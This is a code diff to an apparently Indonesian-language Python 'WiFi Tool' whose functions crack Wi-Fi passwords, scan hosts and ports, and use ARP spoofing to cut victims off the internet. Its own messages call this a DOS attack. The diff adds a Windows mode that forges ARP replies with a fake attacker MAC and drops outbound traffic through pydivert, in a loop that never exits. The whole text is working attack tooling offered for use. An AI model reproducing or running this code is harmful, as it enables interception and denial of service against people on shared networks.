@@ -6,6 +6,7 @@ from scapy.all import *
 import time, argparse, os, pyfiglet, socket, struct, random, platform, subprocess, re
 from termcolor import colored
 from colorama import Fore, Style, init
+import pydivert
 
 def cracking(ssid, wordlist):
         print("[+]Cracking password Wi-fi ssid: ", ssid ,", silahkan tunggu...")
@@ -119,26 +120,33 @@ def scan_ip(gateway):
     
     for x in range(1, 255):
      try:
-      if platform.system() == 'Linux':
-       count = "1"
-       ip = gateway + str(x)
+      if platform.system() == 'Windows':
+        param = "-n"
+      elif platform.system() == 'Linux':
+        param = "-c"
+        
+      count = "1"
+      ip = gateway + str(x)
 
-       res = subprocess.run(["ping", "-c", count, "-W", count, ip], capture_output=True, text=True, timeout=10)
-       output = res.stdout
+      res = subprocess.run(["ping", param, count, ip], capture_output=True, text=True, timeout=10)
+      output = res.stdout
       
-       if res.returncode == 0:
-        print(f"[+]IP Ditemukan: {ip}")
-        ttl_match = re.search(r'ttl=(\d+)', output.lower())
-        ttl = int(ttl_match.group(1)) if ttl_match else 64
-        c = check_os(ttl)
-        print(f"OS: {c}")
-        ma = check_mac(ip)
-        print(f"MAC Address: {ma}")
+      if res.returncode == 0:
+        if "Destination host unreachable." in output:
+                pass
+        else:
+         print(f"[✅]IP Ditemukan: {ip}")
+         ttl_match = re.search(r'ttl=(\d+)', output.lower())
+         ttl = int(ttl_match.group(1)) if ttl_match else 64
+         c = check_os(ttl)
+         print(f"OS: {c}")
+         ma = check_mac(ip)
+         print(f"MAC Address: {ma}")
 
-        for port in PORT_SERVICES.keys():
+         for port in PORT_SERVICES.keys():
             check_port(ip, port, PORT_SERVICES)
 
-        print()
+         print()
      except subprocess.TimeoutExpired:
         print("e")
         pass
@@ -268,7 +276,7 @@ def arp_spoof_single(host, gateway_ip, iface):
             time.sleep(1.5)
         except Exception:
             break
-        
+     
 def broadcast_arp(pdst, iface, gateway_ip):
     mac = get_if_hwaddr(iface)
     ether = Ether(dst="ff:ff:ff:ff:ff:ff")
@@ -293,8 +301,17 @@ def start_spoofing(hosts, pdst, iface, gateway_ip):
 
     return threads
 
+def spoof_windows(host, iface, gateway_ip):
+    attacker_mac = "AA:BB:CC:DD:EE:FF"
+    arp_reply = ARP(op=2, pdst=host, psrc=gateway_ip, hwsrc=attacker_mac)
+    send(arp_reply, verbose=False)
+
 def main():
- os.system('clear')
+ if platform.system() == 'Linux':
+    os.system('clear')
+ elif platform.system() == 'Windows':
+    os.system('cls')
+    
  ascii_art = pyfiglet.figlet_format("WiFi Tool")
  colored_art = colored(ascii_art, "cyan", attrs=["bold"])
  print(colored_art)
@@ -339,41 +356,60 @@ def main():
   ip_range = change_ip(args.g)
   gateway_ip = args.g
   iface = args.i
-
-  if args.m == 'all':
-   pdst = args.p
-   print("[+] Memulai DOS Attack pada 1 jaringan")
-   time.sleep(1.0)
-   enable_forwarding()
-   time.sleep(1.0)
-   hosts = scan_hosts(ip_range, iface, gateway_ip)
-   block_internet(iface)
-   print("[+] Serangan ARP Spoof aktif...")
-   threads = start_spoofing(hosts, pdst, iface, gateway_ip)
   
-   try:
+  if platform.system() == 'Linux':
+   if args.m == 'all':
+    pdst = args.p
+    print("[+] Running di Linux")
+    print("[+] Memulai DOS Attack pada 1 jaringan")
+    time.sleep(1.0)
+    enable_forwarding()
+    time.sleep(1.0)
+    hosts = scan_hosts(ip_range, iface, gateway_ip)
+    block_internet(iface)
+    print("[+] Serangan ARP Spoof aktif...")
+    threads = start_spoofing(hosts, pdst, iface, gateway_ip)
+  
+    try:
      while True:
          time.sleep(1)
-   except KeyboardInterrupt:
+    except KeyboardInterrupt:
          print("\n[!] Stop...")
          unblock_internet()
          disable_forwarding()
          
-  elif args.m == 'single':
-   host = args.ip
-   print("[+] Memulai DOS Attack pada target" ,host)
-   time.sleep(1.0)
-   enable_forwarding()
-   block_internet_single(host)
-   print("[+] Serangan ARP Spoof aktif..." ,host)
-   arp_spoof_single(host, gateway_ip, iface)
+   elif args.m == 'single':
+    host = args.ip
+    print("[+] Memulai DOS Attack pada target" ,host)
+    time.sleep(1.0)
+    enable_forwarding()
+    block_internet_single(host)
+    print("[+] Serangan ARP Spoof aktif..." ,host)
+    arp_spoof_single(host, gateway_ip, iface)
 
-   try:
+    try:
      while True:
          time.sleep(1)
-   except KeyboardInterrupt:
+    except KeyboardInterrupt:
          print("\n[!] Stop...")
          unblock_internet_single()
          disable_forwarding()
+  elif platform.system() == 'Windows':
+    host = args.ip
+    print("[+] Running di Windows")
+    print(f"[+] Memulai DOS Attack pada target {host}")
+    time.sleep(1.0)
+    filter_rule = "outbound"
+
+    with pydivert.WinDivert(filter_rule) as w:
+        while True:
+           spoof_windows(host, iface, gateway_ip)
+
+        print("[+] ARP Spoofing berjalan")
+           
+        for packet in w:
+
+            continue
+            
 
 main()
